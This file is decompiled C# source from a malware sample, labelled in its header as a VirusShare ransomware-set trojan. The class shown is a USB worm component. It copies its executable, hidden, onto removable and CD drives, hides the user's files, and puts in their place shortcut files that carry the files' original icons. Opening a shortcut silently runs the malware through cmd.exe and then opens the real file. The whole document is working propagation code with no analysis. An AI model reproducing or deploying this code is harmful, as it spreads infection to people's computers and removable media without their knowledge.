// Decompiled with JetBrains decompiler
// Type: w.吉屁
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 416A03C6-1169-4785-8C8F-B7DCBEEF5946
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-3fc35088ba76418a38697f688d75da2112d50f56f6e2324a4c9897e3ed81b60f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace w
{
  public class 吉屁
  {
    public object 屁ञ;
    public object i吾;
    private object द;
    private object 提फ;

    public string GetIcon(string ext)
    {
      string icon;
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
        string str = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(ext, false).GetValue(""), (object) "\\DefaultIcon\\"))).GetValue("", (object) ""));
        if (!str.Contains(","))
          str += ",0";
        icon = str;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        icon = "";
        ProjectData.ClearProjectError();
      }
      return icon;
    }

    public object lnk(DriveInfo x, string xx, string ico)
    {
      try
      {
        File.Delete(x.Name + new FileInfo(xx).Name + ".lnk");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object Instance = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), (System.Type) null, "CreateShortcut", new object[1]
      {
        (object) (x.Name + new FileInfo(xx).Name + ".lnk")
      }, (string[]) null, (System.Type[]) null, (bool[]) null);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "TargetPath", new object[1]
      {
        (object) "cmd.exe"
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "WorkingDirectory", new object[1]
      {
        (object) ""
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "Arguments", new object[1]
      {
        (object) ("/c start " + ((string) this.i吾).Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(xx).Name + "\" & exit")
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateSetComplex(Instance, (System.Type) null, "IconLocation", new object[1]
      {
        (object) ico
      }, (string[]) null, (System.Type[]) null, false, true);
      NewLateBinding.LateCall(Instance, (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      object obj;
      return obj;
    }

    public void usb()
    {
      this.द = (object) null;
      this.clean();
      this.द = (object) Thread.CurrentThread;
      this.提फ = (object) 0;
      while (this.提फ == null)
      {
        try
        {
          DriveInfo[] drives = DriveInfo.GetDrives();
          int index1 = 0;
          while (index1 < drives.Length)
          {
            DriveInfo x = drives[index1];
            吉屁.DRV drv;
            if (!((Collection) this.屁ञ).Contains(x.Name.ToLower()))
            {
              drv = new 吉屁.DRV();
              drv.drive = x.Name;
              ((Collection) this.屁ञ).Add((object) drv, x.Name.ToLower());
            }
            else
              drv = (吉屁.DRV) ((Collection) this.屁ञ)[x.Name.ToLower()];
            if (this.提फ == null)
            {
              try
              {
                if (x.IsReady)
                {
                  if (x.TotalFreeSpace > 0L & x.DriveType == DriveType.Removable | x.DriveType == DriveType.CDRom)
                  {
                    try
                    {
                      if (!File.Exists(x.Name + (string) this.i吾))
                      {
                        File.Copy(Application.ExecutablePath, x.Name + (string) this.i吾, true);
                        File.SetAttributes(x.Name + (string) this.i吾, FileAttributes.Hidden);
                      }
                      string[] files = Directory.GetFiles(x.Name);
                      int index2 = 0;
                      while (index2 < files.Length)
                      {
                        string str = files[index2];
                        if (Operators.CompareString(Path.GetExtension(str).ToLower(), ".lnk", false) != 0 & Operators.CompareString(str.ToLower(), x.Name.ToLower() + ((string) this.i吾).ToLower(), false) != 0)
                        {
                          if (!drv.Files.Contains(new FileInfo(str).Name))
                          {
                            if (drv.Files.Count < 20)
                            {
                              this.lnk(x, str, this.GetIcon(Path.GetExtension(str)));
                              drv.Files.Add(new FileInfo(str).Name);
                              File.SetAttributes(str, FileAttributes.Hidden);
                              drv.lnk.Add(File.ReadAllText(x.Name + new FileInfo(str).Name + ".lnk"));
                            }
                          }
                          else if (drv.Files.Contains(new FileInfo(str).Name))
                          {
                            if (File.GetAttributes(str) != FileAttributes.Hidden)
                              File.SetAttributes(str, FileAttributes.Hidden);
                            if (!File.Exists(x.Name + new FileInfo(str).Name + ".lnk"))
                              this.lnk(x, str, this.GetIcon(Path.GetExtension(str)));
                            else if (Operators.CompareString(File.ReadAllText(x.Name + new FileInfo(str).Name + ".lnk"), drv.lnk[drv.Files.IndexOf(new FileInfo(str).Name)], false) != 0)
                              this.lnk(x, str, this.GetIcon(Path.GetExtension(str)));
                          }
                        }
                        checked { ++index2; }
                      }
                    }
                    catch (Exception ex)
                    {
                      ProjectData.SetProjectError(ex);
                      ProjectData.ClearProjectError();
                    }
                  }
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
              checked { ++index1; }
            }
            else
              goto label_31;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(3000);
      }
label_31:
      this.द = (object) null;
    }

    public void clean()
    {
      this.提फ = (object) 1;
      while (this.द != null)
        Thread.Sleep(1);
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index1 = 0;
      while (index1 < drives.Length)
      {
        DriveInfo driveInfo = drives[index1];
        try
        {
          if (driveInfo.IsReady)
          {
            if (driveInfo.DriveType == DriveType.Removable | driveInfo.DriveType == DriveType.CDRom)
            {
              if (File.Exists(driveInfo.Name + (string) this.i吾))
              {
                File.SetAttributes(driveInfo.Name + (string) this.i吾, FileAttributes.Normal);
                File.Delete(driveInfo.Name + (string) this.i吾);
              }
              string[] files = Directory.GetFiles(driveInfo.Name);
              int index2 = 0;
              while (index2 < files.Length)
              {
                string path = files[index2];
                try
                {
                  File.SetAttributes(path, FileAttributes.Normal);
                  if (path.ToLower().EndsWith(".lnk"))
                    File.Delete(path);
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index2; }
              }
              string[] directories = Directory.GetDirectories(driveInfo.Name);
              int index3 = 0;
              while (index3 < directories.Length)
              {
                string path = directories[index3];
                try
                {
                  new DirectoryInfo(path).Attributes = FileAttributes.Normal;
                }
                catch (Exception ex)
                {
                  ProjectData.SetProjectError(ex);
                  ProjectData.ClearProjectError();
                }
                checked { ++index3; }
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index1; }
      }
    }

    public void Start()
    {
      if (this.द != null)
        return;
      this.द = (object) new Thread(new ThreadStart(this.usb), 1);
      ((Thread) this.द).Start();
    }

    public 吉屁()
    {
      this.提फ = (object) 0;
      this.द = (object) null;
      this.屁ञ = (object) new Collection();
    }

    public class DRV
    {
      public string drive;
      public List<string> Files;
      public List<string> lnk;

      public DRV()
      {
        this.Files = new List<string>();
        this.lnk = new List<string>();
      }
    }
  }
}
